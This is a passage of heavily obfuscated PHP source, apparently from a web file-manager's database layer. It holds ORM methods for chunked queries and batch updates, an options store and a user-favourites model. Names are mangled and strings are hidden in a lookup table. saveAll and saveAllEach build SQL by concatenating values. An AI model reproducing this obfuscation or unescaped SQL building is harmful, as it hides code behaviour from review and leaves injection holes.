$¦Ë‘ØÑ´ => $»‰“Ê‹²) { if (is_null($»‰“Ê‹²) && is_string($¦Ë‘ØÑ´)) { $ú²£·é->where(array($áŞ„ê´ä => $‹É€„—Ê, $‡öÔ–Ú[433] => $¦Ë‘ØÑ´))->delete(); continue; } $this->checkLength($»‰“Ê‹², !1, $²€—¹… . $‡öÔ–Ú[4] . $¦Ë‘ØÑ´); $ë×±—›º[] = array($áŞ„ê´ä => $‹É€„—Ê, $‡öÔ–Ú[107] => $¦Ë‘ØÑ´, $‡öÔ–Ú[434] => $»‰“Ê‹²); } $á¾ö¶£é = $‡öÔ–Ú[435] . $²€—¹…; CacheLock::lock($á¾ö¶£é); $ú²£·é->where(array($áŞ„ê´ä => $‹É€„—Ê))->addAll($ë×±—›º, array(), !0); CacheLock::unlock($á¾ö¶£é); return !0; } public function metaGet($ ”şÖ”•, $˜ƒª–‚” = false) { $¹²®“û° =& $_SERVER[Õò”†—·]; if (!$this->tableMeta) { return array(); } $ÓÈâá = $this->tableMeta[$¹²®“û°[431]]; $ƒ‹–ÍøŒ = Model($this->tableMeta[$¹²®“û°[432]]); if ($˜ƒª–‚”) { $ûò·‹µ÷ = array($ÓÈâá => $ ”şÖ”•, $¹²®“û°[107] => $˜ƒª–‚”); return $ƒ‹–ÍøŒ->where($ûò·‹µ÷)->getField($¹²®“û°[434]); } $ûò·‹µ÷ = array($ÓÈâá => $ ”şÖ”•); $ğûÆĞ = $ƒ‹–ÍøŒ->field($¹²®“û°[436])->where($ûò·‹µ÷)->select(); $ğûÆĞ = array_to_keyvalue($ğûÆĞ, $¹²®“û°[107], $¹²®“û°[434]); return $ğûÆĞ; } private function checkDataAutoHas($ê©ÊÏĞ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $Ñ·­Ëç°) { if (in_array($ê©ÊÏĞ, explode($_SERVER[Õò”†—·][60], $Ñ·­Ëç°[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$êÇåÍë¸, $şÑ¡£İé) { $ì¢í•±Ü =& $_SERVER[Õò”†—·]; if (!is_array($êÇåÍë¸)) { return; } foreach ($this->dataAuto as $“ŞÁùË) { $¬ËÆÒ¡ = $“ŞÁùË[0]; if (!in_array($şÑ¡£İé, explode($ì¢í•±Ü[60], $“ŞÁùË[2]))) { continue; } switch (trim($“ŞÁùË[3])) { case $ì¢í•±Ü[381]: case $ì¢í•±Ü[382]: $ºš¥¦¹Õ = $“ŞÁùË[1]; $¬¹áœ¢è = isset($“ŞÁùË[4]) ? (array) $“ŞÁùË[4] : array(); if ($ºš¥¦¹Õ == $ì¢í•±Ü[207] && array_key_exists($¬ËÆÒ¡, $êÇåÍë¸)) { if (!$êÇåÍë¸[$¬ËÆÒ¡]) { unset($êÇåÍë¸[$¬ËÆÒ¡]); } break; } if (isset($êÇåÍë¸[$¬ËÆÒ¡])) { array_unshift($¬¹áœ¢è, $êÇåÍë¸[$¬ËÆÒ¡]); } if ($ì¢í•±Ü[381] == $“ŞÁùË[3]) { $êÇåÍë¸[$¬ËÆÒ¡] = call_user_func_array($ºš¥¦¹Õ, $¬¹áœ¢è); } else { $êÇåÍë¸[$¬ËÆÒ¡] = call_user_func_array(array(&$this, $ºš¥¦¹Õ), $¬¹áœ¢è); } break; case $ì¢í•±Ü[331]: if (isset($êÇåÍë¸[$¬ËÆÒ¡]) && $êÇåÍë¸[$¬ËÆÒ¡]) { $êÇåÍë¸[$¬ËÆÒ¡] = call_user_func_array(array(&$this, $“ŞÁùË[1]), array($êÇåÍë¸[$¬ËÆÒ¡])); } break; case $ì¢í•±Ü[334]: $êÇåÍë¸[$¬ËÆÒ¡] = $êÇåÍë¸[$“ŞÁùË[1]]; break; case $ì¢í•±Ü[354]: if (isset($êÇåÍë¸[$¬ËÆÒ¡]) && !is_string($êÇåÍë¸[$¬ËÆÒ¡])) { $êÇåÍë¸[$¬ËÆÒ¡] = json_encode_force($êÇåÍë¸[$¬ËÆÒ¡]); } break; case $ì¢í•±Ü[383]: if ($êÇåÍë¸[$¬ËÆÒ¡] === $ì¢í•±Ü[22]) { unset($êÇåÍë¸[$¬ËÆÒ¡]); } break; case $ì¢í•±Ü[384]: $êÇåÍë¸[$¬ËÆÒ¡] = $“ŞÁùË[1]; default: break; } } if ($şÑ¡£İé == $ì¢í•±Ü[415]) { $»Ï€¶Úâ = strtolower($this->db->getDbType()); if (strpos($»Ï€¶Úâ, $ì¢í•±Ü[23]) !== 0) { return; } $¡À¬óıÇ = $this->field(!0)->fields; $•óÒ› = $¡À¬óıÇ[$ì¢í•±Ü[313]]; if (isset($¡À¬óıÇ[$ì¢í•±Ü[312]])) { unset($•óÒ›[$¡À¬óıÇ[$ì¢í•±Ü[312]]]); } foreach ($•óÒ› as $öÃ¾šò¸ => $şÑ¡£İé) { if (!isset($êÇåÍë¸[$öÃ¾šò¸])) { $êÇåÍë¸[$öÃ¾šò¸] = $ì¢í•±Ü[22]; } } } } private function dataAfterFilter(&$À”šØß) { $½óáÙˆê =& $_SERVER[Õò”†—·]; foreach ($this->dataAuto as $ö’ëôšŠ) { $›“”àš« = $ö’ëôšŠ[0]; if (!isset($À”šØß[$›“”àš«])) { continue; } if (!in_array($½óáÙˆê[417], explode($½óáÙˆê[60], $ö’ëôšŠ[2]))) { continue; } switch (trim($ö’ëôšŠ[3])) { case $½óáÙˆê[381]: case $½óáÙˆê[382]: $¤ü‘Šû = isset($ö’ëôšŠ[4]) ? (array) $ö’ëôšŠ[4] : array(); array_unshift($¤ü‘Šû, $À”šØß[$›“”àš«]); if (isset($ö’ëôšŠ[4]) && $ö’ëôšŠ[4] == $½óáÙˆê[437]) { $¤ü‘Šû = array($À”šØß[$›“”àš«]); } if ($½óáÙˆê[381] == $ö’ëôšŠ[3]) { $À”šØß[$›“”àš«] = call_user_func_array($ö’ëôšŠ[1], $¤ü‘Šû); } else { $À”šØß[$›“”àš«] = call_user_func_array(array(&$this, $ö’ëôšŠ[1]), $¤ü‘Šû); } break; case $½óáÙˆê[331]: if (isset($À”šØß[$›“”àš«]) && $À”šØß[$›“”àš«]) { $À”šØß[$›“”àš«] = call_user_func_array(array(&$this, $ö’ëôšŠ[1]), array($À”šØß[$›“”àš«])); } break; case $½óáÙˆê[334]: $À”šØß[$›“”àš«] = $À”šØß[$ö’ëôšŠ[1]]; break; case $½óáÙˆê[354]: $œ³ù½Û = $À”šØß[$›“”àš«]; $À”šØß[$›“”àš«] = json_decode($œ³ù½Û, !0); if (is_null($À”šØß[$›“”àš«])) { $À”šØß[$›“”àš«] = $œ³ù½Û; } break; case $½óáÙˆê[383]: if ($À”šØß[$›“”àš«] === $½óáÙˆê[22]) { unset($À”šØß[$›“”àš«]); } break; case $½óáÙˆê[384]: $À”šØß[$›“”àš«] = $ö’ëôšŠ[1]; break; default: break; } } } public function saveAll($ìøöÜïÔ) { $ºÔ–Öçå =& $_SERVER[Õò”†—·]; $Úô¶“§™ = $this->tablePrefix . $this->tableName; $Áç¯¢äÉ = self::SQL_WHERE_IN_CHUNK; $ìøöÜïÔ = is_array($ìøöÜïÔ) ? $ìøöÜïÔ : array(); $¤ã¯Ñó± = $ºÔ–Öçå[438]; $ïµƒşìò = 0; $½……§ä‡ = array(); $çµ¹Àéı = count($ìøöÜïÔ); for ($¤½ëÊÁ = 0; $¤½ëÊÁ < $çµ¹Àéı; $¤½ëÊÁ++) { $›¬‰“ƒƒ = $ìøöÜïÔ[$¤½ëÊÁ]; if (!is_array($›¬‰“ƒƒ) || count($›¬‰“ƒƒ) != 4) { continue; } $¾Çãâ÷ = "\125\120\x44\x41\124\x45\x20\140{$Úô¶“§™}\140\40\x53\105\x54\x20{$›¬‰“ƒƒ[2]}\x20\75\x20\x43\x41\123\x45\40{$›¬‰“ƒƒ[0]}\x20\xa"; if ($ïµƒşìò == 0) { $¤ã¯Ñó± = $¾Çãâ÷; } $½……§ä‡[] = $ºÔ–Öçå[131] . $›¬‰“ƒƒ[1] . $ºÔ–Öçå[131]; $ïµƒşìò++; $¤ã¯Ñó± .= "\x20\127\110\x45\x4e\x20\x27{$›¬‰“ƒƒ[1]}\47\x20\x54\x48\x45\x4e\x20\x27{$›¬‰“ƒƒ[3]}\47\40\xa"; if ($ïµƒşìò == $Áç¯¢äÉ || $¤½ëÊÁ == $çµ¹Àéı - 1) { $†œ­ÇŞš = implode($ºÔ–Öçå[60], $½……§ä‡); $¤ã¯Ñó± .= "\40\x45\x4e\104\x20\x20\127\x48\105\122\105\x20{$›¬‰“ƒƒ[0]}\x20\111\116\x20\x28{$†œ­ÇŞš}\x29\40"; $this->execute($¤ã¯Ñó±); $ïµƒşìò = 0; $¤ã¯Ñó± = $¾Çãâ÷; $this->chunkEventCheck(count($½……§ä‡)); $½……§ä‡ = array(); } } $this->chunkEventSet(); } public function saveAllEach($‘ŞÎªó) { $á²ÆÆû =& $_SERVER[Õò”†—·]; $¾ˆ’ÕÑ· = $this->tablePrefix . $this->tableName; foreach ($‘ŞÎªó as $Øæ­®¢•) { if (!is_array($Øæ­®¢•) || count($Øæ­®¢•) != 4) { continue; } $¸…²Ãï = $Øæ­®¢•[0] . $á²ÆÆû[439] . $Øæ­®¢•[1] . $á²ÆÆû[131]; $éç„ßÛÄ = $Øæ­®¢•[2] . $á²ÆÆû[439] . $Øæ­®¢•[3] . $á²ÆÆû[131]; $ÀÛ°Æğ = "\165\160\x64\x61\164\145\40{$¾ˆ’ÕÑ·}\40\163\x65\164\40{$éç„ßÛÄ}\x20\x77\150\145\162\x65\x20{$¸…²Ãï}\x3b"; $this->execute($ÀÛ°Æğ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($³ï¬Şû— = false, $÷ÒÍÂ¶¡ = false) { $this->_chunkEvent = $³ï¬Şû—; $this->_chunkEventParam = $÷ÒÍÂ¶¡; } private function chunkEventCheck($ÑÃø¤˜×) { if (!$this->_chunkEvent) { return; } $î¼Ã¡üŠ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $î¼Ã¡üŠ[$_SERVER[Õò”†—·][440]] = $ÑÃø¤˜×; Hook::trigger($this->_chunkEvent, $î¼Ã¡üŠ); } public function addAll($Î×­¿, $­¢¯ = array(), $ıŞ¾Êö’ = false) { $‚Ñ’ËÂ§ =& $_SERVER[Õò”†—·]; ignore_timeout(); $×ä‹–æÆ = self::SQL_WHERE_IN_CHUNK; if (empty($Î×­¿)) { $this->error = think_lang($‚Ñ’ËÂ§[332]); return !1; } $­¢¯ = $this->_parseOptions($­¢¯); foreach ($Î×­¿ as $ĞÖ‡‹Êª => $ĞèŠÜ³¯) { $Î×­¿[$ĞÖ‡‹Êª] = $this->_facade($ĞèŠÜ³¯); $this->_beforeInsert($Î×­¿[$ĞÖ‡‹Êª], $­¢¯); } if (method_exists($this->db, $‚Ñ’ËÂ§[333])) { for ($°¾¸„î’ = 0; $°¾¸„î’ < count($Î×­¿); $°¾¸„î’ += $×ä‹–æÆ) { $Å¹‚úé = array_slice($Î×­¿, $°¾¸„î’, $×ä‹–æÆ); if (!is_array($Å¹‚úé) || count($Å¹‚úé) == 0) { break; } $Ûäú®»ã = $this->db->insertAll($Å¹‚úé, $­¢¯, $ıŞ¾Êö’); $this->chunkEventCheck(count($Å¹‚úé)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Î×­¿ as $ĞÖ‡‹Êª => $ĞèŠÜ³¯) { $Ûäú®»ã = $this->db->insert($ĞèŠÜ³¯, $­¢¯, $ıŞ¾Êö’); } $this->commit(); } if (!1 !== $Ûäú®»ã) { $Õó‰¿úğ = $this->getLastInsID(); if ($Õó‰¿úğ) { return $Õó‰¿úğ; } } return $Ûäú®»ã; } public function save($ˆß ÂŠ‘ = '', $è½“ô— = array()) { $ê¸–ïè =& $_SERVER[Õò”†—·]; $Š¸´¯ì = self::SQL_WHERE_IN_CHUNK; $Ô–Å­É  = $this->optionsValue(); $˜Èä¼Æú = $this->findWhereField($Ô–Å­É ); if (!$˜Èä¼Æú) { return parent::save($ˆß ÂŠ‘, $è½“ô—); } $¹ùâ‹í¡ = 0; $÷·¡¨§² = $Ô–Å­É [$ê¸–ïè[336]][$˜Èä¼Æú][1]; $÷·¡¨§² = is_array($÷·¡¨§²) ? $÷·¡¨§² : array(); $É²ùÙ‘¦ = count($÷·¡¨§²); for ($ãÙ°Ññ› = 0; $ãÙ°Ññ› < $É²ùÙ‘¦; $ãÙ°Ññ› += $Š¸´¯ì) { $‡½¯–’ = array_slice($÷·¡¨§², $ãÙ°Ññ›, $Š¸´¯ì); if (!is_array($‡½¯–’) || count($‡½¯–’) == 0) { break; } $Ô–Å­É [$ê¸–ïè[336]][$˜Èä¼Æú][1] = $‡½¯–’; $this->optionsValue($Ô–Å­É ); $¹ùâ‹í¡ += parent::save($ˆß ÂŠ‘, $è½“ô—); $this->chunkEventCheck(count($‡½¯–’)); } $this->chunkEventSet(); return $¹ùâ‹í¡; } public function add($Óıˆõ×€ = '', $’¤š±´Ú = array(), $†Á¦Ô˜ = false) { if ($this->addTaskStatus && is_array($Óıˆõ×€)) { $this->addTaskData[] = $Óıˆõ×€; return; } return parent::add($Óıˆõ×€, $’¤š±´Ú, $†Á¦Ô˜); } public function parseWhereLike($Üä‚å‹Å, $ğÆ Â…¡ = '', $šæÚ–•ê = false, &$–“…õˆ¿ = false) { $İ‡½–ó¨ =& $_SERVER[Õò”†—·]; $¸éóæıÜ = $GLOBALS[$İ‡½–ó¨[16]][$İ‡½–ó¨[441]]; if (!$¸éóæıÜ[$İ‡½–ó¨[442]]) { return $Üä‚å‹Å; } if (!is_array($Üä‚å‹Å)) { return $Üä‚å‹Å; } $ìä”ì•ï = array(); $õ¢øÍÌ = 0; foreach ($Üä‚å‹Å as $ã·Á¤“Â => $œ˜èç) { if (is_array($œ˜èç) && count($œ˜èç) == 2 && $œ˜èç[0] == $İ‡½–ó¨[443] && is_string($œ˜èç[1]) && substr($œ˜èç[1], 0, 1) == $İ‡½–ó¨[444] && substr($œ˜èç[1], strlen($œ˜èç[1]) - 1, 1) == $İ‡½–ó¨[444]) { $–“…õˆ¿ = !0; $®Ğ¨…± = is_string($ã·Á¤“Â) ? $ã·Á¤“Â : $ğÆ Â…¡; $ßÚÍò¯ = substr($œ˜èç[1], 1, strlen($œ˜èç[1]) - 2); $ßÚÍò¯ = $this->db->escapeString($ßÚÍò¯); if (!strpos($®Ğ¨…±, $İ‡½–ó¨[20])) { $®Ğ¨…± = $İ‡½–ó¨[445] . $®Ğ¨…± . $İ‡½–ó¨[445]; } $ñÛºÄÚ‚ = $İ‡½–ó¨[221] . $ßÚÍò¯ . $İ‡½–ó¨[221]; $ßÚÍò¯ = str_replace(array($İ‡½–ó¨[20], $İ‡½–ó¨[446], $İ‡½–ó¨[21]), $İ‡½–ó¨[447], $ßÚÍò¯); if ($¸éóæıÜ[$İ‡½–ó¨[448]]) { $ñÛºÄÚ‚ = $İ‡½–ó¨[449] . $ßÚÍò¯ . $İ‡½–ó¨[450]; if ($¸éóæıÜ[$İ‡½–ó¨[451]]) { $ñÛºÄÚ‚ = $İ‡½–ó¨[450] . $ßÚÍò¯ . $İ‡½–ó¨[449]; } } $ìä”ì•ï[$õ¢øÍÌ] = $İ‡½–ó¨[452] . $®Ğ¨…± . $İ‡½–ó¨[453] . $ñÛºÄÚ‚ . $İ‡½–ó¨[454]; $õ¢øÍÌ++; continue; } if (is_array($œ˜èç)) { $ğÆ Â…¡ = is_string($ã·Á¤“Â) ? $ã·Á¤“Â : $ğÆ Â…¡; $œ˜èç = $this->parseWhereLike($œ˜èç, $ğÆ Â…¡, !0, $–“…õˆ¿); } if (is_numeric($ã·Á¤“Â)) { $ìä”ì•ï[$õ¢øÍÌ] = $œ˜èç; $õ¢øÍÌ++; } else { $ìä”ì•ï[$ã·Á¤“Â] = $œ˜èç; } } if ($–“…õˆ¿ && !$šæÚ–•ê) { } return $ìä”ì•ï; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($÷Şè§µÚ = array()) { $Ã¨•ğ‘ï =& $_SERVER[Õò”†—·]; $˜•ºÒµ„ = self::SQL_WHERE_IN_CHUNK; $è×“„Ÿã = $this->optionsValue(); $¹¨è§ÅÚ = $this->findWhereField($è×“„Ÿã); if (!$¹¨è§ÅÚ || isset($è×“„Ÿã[$Ã¨•ğ‘ï[352]]) || isset($è×“„Ÿã[$Ã¨•ğ‘ï[413]])) { return parent::select($÷Şè§µÚ); } $€˜õ®‰€ = $è×“„Ÿã[$Ã¨•ğ‘ï[336]][$¹¨è§ÅÚ][1]; $€˜õ®‰€ = is_array($€˜õ®‰€) ? $€˜õ®‰€ : array(); $äÔŸº•¢ = null; for ($š»¦×Ä = 0; $š»¦×Ä < count($€˜õ®‰€); $š»¦×Ä += $˜•ºÒµ„) { $¨¥·£ğº = array_slice($€˜õ®‰€, $š»¦×Ä, $˜•ºÒµ„); if (!is_array($¨¥·£ğº) || count($¨¥·£ğº) == 0) { break; } $è×“„Ÿã[$Ã¨•ğ‘ï[336]][$¹¨è§ÅÚ][1] = $¨¥·£ğº; $this->optionsValue($è×“„Ÿã); $×ÑÊâ‡¨ = parent::select($÷Şè§µÚ); if (!$×ÑÊâ‡¨) { continue; } $äÔŸº•¢ = is_array($äÔŸº•¢) ? $äÔŸº•¢ : array(); $äÔŸº•¢ = array_merge($äÔŸº•¢, $×ÑÊâ‡¨); } return $äÔŸº•¢; } public function delete($Çñ•Ö›´ = array()) { $îƒŒİò¶ =& $_SERVER[Õò”†—·]; $ÒÍ£°Üò = self::SQL_WHERE_IN_CHUNK; $¡ºæ¾¬« = $this->optionsValue(); $È³âë¦Ï = $this->findWhereField($¡ºæ¾¬«); if (!$È³âë¦Ï) { return parent::delete($Çñ•Ö›´); } $’ÜÂÕßÍ = 0; $ò¾’è¶µ = $¡ºæ¾¬«[$îƒŒİò¶[336]][$È³âë¦Ï][1]; $ò¾’è¶µ = is_array($ò¾’è¶µ) ? $ò¾’è¶µ : array(); for ($Ñæ¥Å²× = 0; $Ñæ¥Å²× < count($ò¾’è¶µ); $Ñæ¥Å²× += $ÒÍ£°Üò) { $óëƒÚ‚ğ = array_slice($ò¾’è¶µ, $Ñæ¥Å²×, $ÒÍ£°Üò); if (!is_array($óëƒÚ‚ğ) || count($óëƒÚ‚ğ) == 0) { break; } $¡ºæ¾¬«[$îƒŒİò¶[336]][$È³âë¦Ï][1] = $óëƒÚ‚ğ; $this->optionsValue($¡ºæ¾¬«); $’ÜÂÕßÍ += parent::delete($Çñ•Ö›´); } return $’ÜÂÕßÍ; } private function findWhereField($œéáé°) { $±™Ó²óÒ =& $_SERVER[Õò”†—·]; $×Ë·Ä = self::SQL_WHERE_IN_CHUNK; if (!is_array($œéáé°) || !is_array($œéáé°[$±™Ó²óÒ[336]])) { return !1; } foreach ($œéáé°[$±™Ó²óÒ[336]] as $²Òª‘Ôú => $çñÙïó˜) { if (is_array($çñÙïó˜) && isset($çñÙïó˜[0]) && is_string($çñÙïó˜[0]) && strtolower($çñÙïó˜[0]) == $±™Ó²óÒ[17] && is_array($çñÙïó˜[1]) && count($çñÙïó˜[1]) > $×Ë·Ä) { ignore_timeout(); return $²Òª‘Ôú; } } return !1; } public function setMasterDB($ÓÕ•ÜšÎ = true) { think_config($_SERVER[Õò”†—·][455], $ÓÕ•ÜšÎ); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\163\164\x65\x6d\x4f\x70\164\151\157\156"; public $field = array(); public function listData($Á’™õ‹ö = false, $»¿·¡Î¾ = "\x6d\157\144\151\x66\x79\x54\x69\155\x65", $¦’­ìƒ÷ = false) { $›Ö­ÏÊÈ = Model($this->modelType)->get(!1, $this->optionType, !0); $…š‚ò‘Ì = array_values($›Ö­ÏÊÈ); if ($…š‚ò‘Ì && $…š‚ò‘Ì[0] && !is_array($…š‚ò‘Ì[0])) { Model($this->modelType)->cacheRemove($this->optionType); $›Ö­ÏÊÈ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$›Ö­ÏÊÈ) { return $Á’™õ‹ö ? null : array(); } if (!$Á’™õ‹ö) { $›Ö­ÏÊÈ = array_filter(array_values($›Ö­ÏÊÈ)); return array_sort_by($›Ö­ÏÊÈ, $»¿·¡Î¾, $¦’­ìƒ÷); } return $›Ö­ÏÊÈ[$_SERVER[Õò”†—·][456] . $Á’™õ‹ö]; } public function insert($ŒŞáÔõé) { $û˜õİ×è =& $_SERVER[Õò”†—·]; $ŒŞáÔõé = array_field_key($ŒŞáÔõé, $this->field); $€è‹Ù¢Ú = Model($this->modelType)->get($û˜õİ×è[457], $this->optionType . $û˜õİ×è[458]); $€è‹Ù¢Ú = $€è‹Ù¢Ú ? $€è‹Ù¢Ú : 0; $ŒŞáÔõé[$û˜õİ×è[459]] = ++$€è‹Ù¢Ú; $ŒŞáÔõé[$û˜õİ×è[232]] = time(); $ŒŞáÔõé[$û˜õİ×è[98]] = time(); Model($this->modelType)->set($û˜õİ×è[457], $€è‹Ù¢Ú, $this->optionType . $û˜õİ×è[458]); Model($this->modelType)->set($û˜õİ×è[456] . $€è‹Ù¢Ú, $ŒŞáÔõé, $this->optionType); return $€è‹Ù¢Ú; } public function update($Öï§âß, $œÜ ƒü–) { $¹ŠŒÛé– =& $_SERVER[Õò”†—·]; $œÜ ƒü– = array_field_key($œÜ ƒü–, $this->field); $°¨èô‘… = $this->listData($Öï§âß); if (!$°¨èô‘… || !$Öï§âß) { return !1; } $œÜ ƒü– = array_merge($°¨èô‘…, $œÜ ƒü–); $œÜ ƒü–[$¹ŠŒÛé–[98]] = time(); return Model($this->modelType)->set($¹ŠŒÛé–[456] . $Öï§âß, $œÜ ƒü–, $this->optionType); } public function remove($û´¶à—ú) { if (!$û´¶à—ú) { return !1; } return Model($this->modelType)->remove($_SERVER[Õò”†—·][456] . $û´¶à—ú, $this->optionType); } public function clear() { $¢œŒ‰¹ç =& $_SERVER[Õò”†—·]; Model($this->modelType)->remove($¢œŒ‰¹ç[457], $this->optionType . $¢œŒ‰¹ç[458]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($›üé£‘©, $ˆ­›Œß³) { if (!$ˆ­›Œß³) { return !1; } $×üì¼ÔÅ = $this->listData(); $×üì¼ÔÅ = array_to_keyvalue($×üì¼ÔÅ, $›üé£‘©); return isset($×üì¼ÔÅ[$ˆ­›Œß³]) ? $×üì¼ÔÅ[$ˆ­›Œß³] : !1; } public function findByName($ÉÍ‹•æğ) { return $this->findByKey($_SERVER[Õò”†—·][42], $ÉÍ‹•æğ); } protected function resetData($ãĞöï˜°) { $¨ÍËÙØü =& $_SERVER[Õò”†—·]; $ãĞöï˜° = is_array($ãĞöï˜°) ? $ãĞöï˜° : array(); $ß°åÊ€ƒ = array(); for ($×ìİÒøÉ = 0; $×ìİÒøÉ < count($ãĞöï˜°); $×ìİÒøÉ++) { $ß°åÊ€ƒ[$¨ÍËÙØü[456] . $ãĞöï˜°[$×ìİÒøÉ][$¨ÍËÙØü[459]]] = $ãĞöï˜°[$×ìİÒøÉ]; } return Model($this->modelType)->set($ß°åÊ€ƒ, !1, $this->optionType); } private function getAutoName($ÖÙ¡™’¤) { $¥Ğ§¶ ˆ = array_to_keyvalue($this->listData(), $_SERVER[Õò”†—·][42]); if (!$¥Ğ§¶ ˆ || !isset($¥Ğ§¶ ˆ[$ÖÙ¡™’¤])) { return $ÖÙ¡™’¤; } for ($Æ Ğ†¾ = 1; $Æ Ğ†¾ < count($¥Ğ§¶ ˆ); $Æ Ğ†¾++) { $®ÛÕöİµ = $ÖÙ¡™’¤ . "\50{$Æ Ğ†¾}\x29"; if (!isset($¥Ğ§¶ ˆ[$®ÛÕöİµ])) { return $®ÛÕöİµ; } } return $®ÛÕöİµ; } } goto a‘ µÈ¡Úé; fášÃåë÷Ä: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($•ÅÄ‹Ë) { $Šãå® =& $_SERVER[Õò”†—·]; return array($Šãå®[2069] => array(USER_ID, $Šãå®[2430])); } protected function listData() { $ü–÷Àí =& $_SERVER[Õò”†—·]; $ù±‘ô«Ï = array($ü–÷Àí[1746] => USER_ID, $ü–÷Àí[542] => 0); $Äë˜Å = $ü–÷Àí[2431]; $²Ÿşôßè = $this->field($Äë˜Å)->where($ù±‘ô«Ï)->order($ü–÷Àí[2432])->select(); return $²Ÿşôßè ? $²Ÿşôßè : array(); } protected function resetCache() { } protected function listView() { $™…†Ëæ¦ =& $_SERVER[Õò”†—·]; $®ôéæ¥ = $this->listData(); $¾ø›ˆóø = array_filter_by_field($®ôéæ¥, $™…†Ëæ¦[43], $™…†Ëæ¦[474]); $¹õ®»Ã = array_to_keyvalue($¾ø›ˆóø, $™…†Ëæ¦[22], $™…†Ëæ¦[97]); if (!$¹õ®»Ã) { return $®ôéæ¥; } $û‹ÆÃì» = 2000; $å®§›ç½ = array($™…†Ëæ¦[475] => array($™…†Ëæ¦[476], $¹õ®»Ã)); $ßñüêá = Model($™…†Ëæ¦[875])->listSource($å®§›ç½, $û‹ÆÃì»); $ßñüêá = array_merge($ßñüêá[$™…†Ëæ¦[96]], $ßñüêá[$™…†Ëæ¦[95]]); $ßñüêá = array_to_keyvalue($ßñüêá, $™…†Ëæ¦[194]); foreach ($®ôéæ¥ as $°‚®ÉË» => $²Ùå¶í¶) { $€éä‚¨Ñ = $ßñüêá[$²Ùå¶í¶[$™…†Ëæ¦[97]]]; $€éä‚¨Ñ = $€éä‚¨Ñ ? $€éä‚¨Ñ : array(); $®ôéæ¥[$°‚®ÉË»] = array_merge($€éä‚¨Ñ, $²Ùå¶í¶); } return $®ôéæ¥; } protected function addFav($øíÎ‚ø­, $¤Ÿç³Ú = '', $¬¾Ùî¶ = "\x73\157\165\162\x63\x65") { $ÓÙèô– =& $_SERVER[Õò”†—·]; $ÈŠÀû‰¸ = array($ÓÙèô–[1746] => USER_ID, $ÓÙèô–[542] => 0, $ÓÙèô–[480] => $¬¾Ùî¶, $ÓÙèô–[479] => $øíÎ‚ø­); if ($this->where($ÈŠÀû‰¸)->find()) { return !1; } $ÈŠÀû‰¸ = array($ÓÙèô–[1746] => USER_ID, $ÓÙèô–[542] => 0); $ù²£‘»¤ = $this->where($ÈŠÀû‰¸)->max($ÓÙèô–[1977]); if (!$ù²£‘»¤) { $ù²£‘»¤ = 0; } if (!$¤Ÿç³Ú && $¬¾Ùî¶ == $ÓÙèô–[474]) { $ÆüÌ‘¢ = Model($ÓÙèô–[1388])->where(array($ÓÙèô–[475] => $øíÎ‚ø­))->find(); if (!$ÆüÌ‘¢) { return !1; } $¤Ÿç³Ú = $ÆüÌ‘¢[$ÓÙèô–[42]]; } $¤Ÿç³Ú = $this->getAutoName($¤Ÿç³Ú); $êÕ¾µ— = array($ÓÙèô–[1746] => USER_ID, $ÓÙèô–[542] => 0, $ÓÙèô–[478] => $¤Ÿç³Ú, $ÓÙèô–[479] => $øíÎ‚ø­, $ÓÙèô–[480] => $¬¾Ùî¶, $ÓÙèô–[1957] => $ù²£‘»¤ + 1); return $this->add($êÕ¾µ—); } protected function remove($ê“‘‰©) { $ÈëŒõÂÍ =& $_SERVER[Õò”†—·]; $À½­óñÀ = array($ÈëŒõÂÍ[1746] => USER_ID, $ÈëŒõÂÍ[477] => $ê“‘‰©); return $this->where($À½­óñÀ)->delete(); } protected function removeByName($ˆŠÃƒ‘ş) { $µ¸òñ =& $_SERVER[Õò”†—·]; $Ù•Ì–¥Ü = array($µ¸òñ[1746] => USER_ID, $µ¸òñ[478] => $ˆŠÃƒ‘ş, $µ¸òñ[542] => 0); return $this->where($Ù•Ì–¥Ü)->delete(); } protected function rename($¥ŸĞï‡½, $ĞÈ§ÛÅ) { $§ìÌ‰®è =& $_SERVER[Õò”†—·]; if ($¥ŸĞï‡½ == $ĞÈ§ÛÅ) { return !1; } $âÓÀ¼¤£ = $this->getAutoName($ĞÈ§ÛÅ); if ($ĞÈ§ÛÅ != $âÓÀ¼¤£) { return !1; } $¨îŠáõÕ = array($§ìÌ‰®è[1746] => USER_ID, $§ìÌ‰®è[542] => 0, $§ìÌ‰®è[42] => $¥ŸĞï‡½); return $this->where($¨îŠáõÕ)->save(array($§ìÌ‰®è[42] => $ĞÈ§ÛÅ)); } protected function resetSort($…ÌøŸ“) { $ãü‹Ü© =& $_SERVER[Õò”†—·]; $…ÌøŸ“ = is_array($…ÌøŸ“) ? $…ÌøŸ“ : array(); $“¸…ÜºÃ = array($ãü‹Ü©[1746] => USER_ID); for ($…Ö“–âı = 0; $…Ö“–âı < count($…ÌøŸ“); $…Ö“–âı++) { $“¸…ÜºÃ[$ãü‹Ü©[477]] = $…ÌøŸ“[$…Ö“–âı]; $this->where($“¸…ÜºÃ)->save(array($ãü‹Ü©[1957] => $…Ö“–âı + 1)); } return !0; } protected function moveTop($‰Ùì±ë) { $ÇœèÚí¿ =& $_SERVER[Õò”†—·]; $‹‹ôñ¹« = array($ÇœèÚí¿[1746] => USER_ID, $ÇœèÚí¿[542] => 0); $ˆÊ¡ = $this->where($‹‹ôñ¹«)->where(array($ÇœèÚí¿[42] => $‰Ùì±ë))->find(); if (!$ˆÊ¡) { return; } $úºŒ’¯Ü = $this->field($ÇœèÚí¿[459])->where($‹‹ôñ¹«)->order($ÇœèÚí¿[2432])->select(); $úºŒ’¯Ü = 